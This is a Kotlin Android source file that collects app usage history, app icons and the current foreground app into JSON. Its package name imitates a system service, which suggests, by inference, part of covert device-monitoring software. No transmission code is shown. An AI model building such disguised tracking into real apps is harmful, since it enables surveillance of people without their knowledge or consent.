package com.system.service.monitors

import android.app.usage.UsageStatsManager
import android.content.Context
import org.json.JSONArray
import org.json.JSONObject

object AppUsageManager {

    /** Pichle N ghante mein kaun kaun se apps khule */
    fun getUsageStats(context: Context, hours: Int = 24): JSONArray {
        val result = JSONArray()
        try {
            val usm = context.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
            val pm  = context.packageManager
            val now = System.currentTimeMillis()
            val start = now - hours * 60 * 60 * 1000L
            val stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_BEST, start, now)
            stats?.sortedByDescending { it.lastTimeUsed }?.forEach { s ->
                if (s.totalTimeInForeground > 0) {
                    val friendlyName = try {
                        pm.getApplicationLabel(pm.getApplicationInfo(s.packageName, 0)).toString()
                    } catch (_: Exception) { s.packageName.substringAfterLast('.') }
                    val iconB64 = try {
                        val drawable = pm.getApplicationIcon(s.packageName)
                        val bmp = android.graphics.Bitmap.createBitmap(48, 48, android.graphics.Bitmap.Config.ARGB_8888)
                        val canvas = android.graphics.Canvas(bmp)
                        drawable.setBounds(0, 0, 48, 48)
                        drawable.draw(canvas)
                        val stream = java.io.ByteArrayOutputStream()
                        bmp.compress(android.graphics.Bitmap.CompressFormat.PNG, 60, stream)
                        android.util.Base64.encodeToString(stream.toByteArray(), android.util.Base64.NO_WRAP)
                    } catch (_: Exception) { "" }
                    result.put(JSONObject().apply {
                        put("package",   s.packageName)
                        put("name",      friendlyName)
                        put("lastUsed",  s.lastTimeUsed)
                        put("totalTime", s.totalTimeInForeground)
                        put("minutes",   s.totalTimeInForeground / 60000)
                        put("icon",      iconB64)
                    })
                }
            }
        } catch (_: Exception) {}
        return result
    }

    /** Abhi kaun sa app chal raha hai */
    fun getCurrentApp(context: Context): String? {
        return try {
            val usm = context.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
            val now = System.currentTimeMillis()
            val stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_BEST, now - 5000, now)
            stats?.maxByOrNull { it.lastTimeUsed }?.packageName
        } catch (_: Exception) { null }
    }
}
